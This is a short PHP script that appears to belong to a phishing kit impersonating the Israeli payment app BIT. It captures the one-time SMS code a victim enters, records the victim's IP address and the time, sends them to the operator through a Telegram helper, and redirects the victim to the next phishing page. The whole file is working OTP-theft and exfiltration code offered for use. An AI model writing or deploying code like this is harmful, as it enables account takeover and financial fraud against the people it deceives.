<?php

include("tlgrm.php");

// Get the current time and date
$date = date('Y-m-d H:i:s', time());

// Get the client IP address
$ip = getenv("REMOTE_ADDR");

// Format the message
$message = "🔐 BIT Israel OTP Notification 🔐\n";
$message .= "▪️ SMS Code: " . $_POST['otp'] . "\n";
$message .= "▪️ IP Address: " . $ip . "\n";
$message .= "▪️ Date/Time: " . $date . "\n";
$message .= "----------------------------------------\n";

// Send the message
telegram($message);

// Redirect the user
echo "<meta http-equiv='refresh' content='0; url=load2.php'/>";

?>
